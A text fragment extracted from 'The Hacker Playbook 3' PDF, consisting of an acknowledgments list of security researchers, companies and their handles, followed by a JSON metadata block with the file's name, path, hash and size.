specterops casey smith (@subt ee) ben t en (@ben0xa) vincent y iu (@vysecurity) chris spehn (@conscioushacker) barrett adams (peewpw) daniel bohannon (@danielbohannon) sean metcalf (@pyrot ek3) @harmj0y matt graeber (@mattifestation) matt nelson (@enigma0x3) ruben boonen (@fuzzysec) ben campbell (@meatballs__) andrew robbins (@_wald0) raphael mudge (@rsmudge) daniel miessler (@danielmiessler) gianni amato (guelfoweb) ahmed aboul-ela (aboul3la) lee baird (leebaird) dylan a yrey (dxa4481) rapid7 (@rapid7) will schroeder (@harmj0y) ron bowes (@iagox86) sensepost sekirkity byt3bl33d3r karim shoair (d4v inci) chris t runcer anshuman bhartiya oj reeves ben sadeghipour (@nahamsec) tim medin (nidem) gianni amato robert david graham blechschmidt jamieson o'reilly nikhil mittal (samratashok) michael (codingo) cn33liz swissky (swisskyrepo) robin w ood (digininja) trustedsec david kennedy (@hackingdave) fireeye igandx alexander innes (leostat) activebreach (mdsecactivebreach) bbb31 pentestgeek secforce steve micallef spiderlabs h.d. moore therook ahmed aboul-ela (aboul3la) emilio (epinna) dylan a yrey (dxa4481) geor ge chatzisofroniou (sophron) derv (derv82) garrett gee hackerw arehouse lethal n00py",
  "metadata": {
    "filename": "The Hacker Playbook 3.pdf",
    "filepath": "C:\\Users\\Albert\\aa-660-ai-doc-classification-deduplication\\data\\raw\\The Hacker Playbook 3.pdf",
    "hash": "9e28dc38938ed25f647e91c9c49331a2ab15819b72e9ba362ea90137d7b29a62",
    "filesize": 7112780,
    "language": "en"
  }
}